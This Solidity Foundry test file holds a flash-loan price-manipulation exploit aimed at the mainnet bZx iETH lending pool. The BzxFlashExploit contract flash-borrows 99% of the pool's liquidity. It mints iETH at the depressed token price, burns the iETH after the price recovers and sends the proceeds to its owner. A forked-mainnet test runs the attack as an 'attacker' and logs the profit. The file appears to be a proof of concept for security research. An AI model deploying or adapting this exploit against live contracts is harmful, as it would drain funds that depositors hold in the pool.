// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IiToken {
    function mint(address receiver, uint256 depositAmount) external returns (uint256 mintAmount);
    function burn(address receiver, uint256 burnAmount) external returns (uint256 loanAmountPaid);
    function flashBorrow(
        uint256 borrowAmount,
        address borrower,
        address target,
        string calldata signature,
        bytes calldata data
    ) external payable returns (bytes memory);
    function tokenPrice() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalAssetSupply() external view returns (uint256);
    function totalAssetBorrow() external view returns (uint256);
    function marketLiquidity() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function mintWithEther(address receiver) external payable returns (uint256 mintAmount);
    function burnToEther(address receiver, uint256 burnAmount) external returns (uint256 loanAmountPaid);
}

contract BzxFlashExploit {
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IiToken constant iETH = IiToken(0xB983E01458529665007fF7E0CDdeCDB74B967Eb6);

    address public owner;
    uint256 public flashBorrowAmount;

    constructor() {
        owner = msg.sender;
    }

    // Called by iETH during flashBorrow callback
    function executeOperation(
        uint256 borrowAmount,
        bytes calldata data
    ) external {
        // During flash borrow, the pool's WETH balance is reduced
        // tokenPrice should be lower
        uint256 priceInFlash = iETH.tokenPrice();
        console.log("Token price during flash:", priceInFlash);
        console.log("Pool WETH during flash:", WETH.balanceOf(address(iETH)));
        console.log("Total asset supply during flash:", iETH.totalAssetSupply());

        // Mint iETH at the lower price
        uint256 wethBalance = WETH.balanceOf(address(this));
        console.log("Our WETH balance:", wethBalance);

        if (wethBalance > borrowAmount) {
            // We have extra WETH to mint with
            uint256 mintAmount = wethBalance - borrowAmount;
            WETH.approve(address(iETH), mintAmount);
            uint256 minted = iETH.mint(address(this), mintAmount);
            console.log("Minted iETH:", minted);
        }

        // Repay the flash borrow
        WETH.transfer(address(iETH), borrowAmount);
    }

    function exploit(uint256 _flashAmount, uint256 _mintAmount) external {
        require(msg.sender == owner, "not owner");

        flashBorrowAmount = _flashAmount;

        // Wrap ETH to WETH for minting
        if (_mintAmount > 0) {
            WETH.deposit{value: _mintAmount}();
        }

        uint256 priceBefore = iETH.tokenPrice();
        console.log("Token price before flash:", priceBefore);
        console.log("Total asset supply before:", iETH.totalAssetSupply());
        console.log("Pool WETH before:", WETH.balanceOf(address(iETH)));

        // Flash borrow from iETH
        iETH.flashBorrow(
            _flashAmount,
            address(this),
            address(this),
            "executeOperation(uint256,bytes)",
            abi.encode(_flashAmount, "")
        );

        uint256 priceAfter = iETH.tokenPrice();
        console.log("Token price after flash:", priceAfter);

        // Now burn any iETH we have at the restored (higher) price
        uint256 iTokenBal = iETH.balanceOf(address(this));
        if (iTokenBal > 0) {
            console.log("iETH balance to burn:", iTokenBal);
            uint256 wethReceived = iETH.burn(address(this), iTokenBal);
            console.log("WETH received from burn:", wethReceived);
        }

        // Convert WETH to ETH and send to owner
        uint256 wethBal = WETH.balanceOf(address(this));
        if (wethBal > 0) {
            WETH.withdraw(wethBal);
        }
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract TestBzxFlash is Test {
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IiToken constant iETH = IiToken(0xB983E01458529665007fF7E0CDdeCDB74B967Eb6);

    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_flashBorrowPriceManipulation() public {
        vm.startPrank(attacker);

        // Deploy exploit contract
        BzxFlashExploit exploit = new BzxFlashExploit();

        uint256 balBefore = attacker.balance;
        console.log("Attacker ETH before:", balBefore);

        // Flash borrow most of the pool's WETH to maximize price impact
        uint256 flashAmount = iETH.marketLiquidity() * 99 / 100; // 99% of liquidity
        uint256 mintAmount = 10 ether; // Use 10 ETH to mint during the flash

        console.log("Flash borrow amount:", flashAmount);

        // Fund the exploit contract
        (bool ok,) = address(exploit).call{value: mintAmount}("");
        require(ok);

        exploit.exploit(flashAmount, mintAmount);

        uint256 balAfter = attacker.balance;
        console.log("Attacker ETH after:", balAfter);
        console.log("Profit:", balAfter > balBefore ? balAfter - balBefore : 0);
        console.log("Loss:", balBefore > balAfter ? balBefore - balAfter : 0);

        vm.stopPrank();
    }

    function test_checkPriceImpact() public view {
        // Just check what the price impact would be
        uint256 price = iETH.tokenPrice();
        uint256 totalSupply = iETH.totalSupply();
        uint256 totalAsset = iETH.totalAssetSupply();
        uint256 totalBorrow = iETH.totalAssetBorrow();
        uint256 poolWeth = WETH.balanceOf(address(iETH));
        uint256 liquidity = iETH.marketLiquidity();

        console.log("Current token price:", price);
        console.log("Total supply:", totalSupply);
        console.log("Total asset supply:", totalAsset);
        console.log("Total asset borrow:", totalBorrow);
        console.log("Pool WETH:", poolWeth);
        console.log("Market liquidity:", liquidity);

        // If we flash borrow 99% of liquidity:
        // New pool WETH = poolWeth - 99% * liquidity
        // New totalAsset = newPoolWeth + totalBorrow
        // New tokenPrice = newTotalAsset * 1e18 / totalSupply
        uint256 flashAmount = liquidity * 99 / 100;
        uint256 newPoolWeth = poolWeth - flashAmount;
        uint256 newTotalAsset = newPoolWeth + totalBorrow;
        uint256 newPrice = newTotalAsset * 1e18 / totalSupply;

        console.log("--- After flash borrow ---");
        console.log("Flash amount:", flashAmount);
        console.log("New pool WETH:", newPoolWeth);
        console.log("New total asset:", newTotalAsset);
        console.log("New token price:", newPrice);
        console.log("Price reduction:", price - newPrice);
        console.log("Price reduction %:", (price - newPrice) * 100 / price);
    }
}
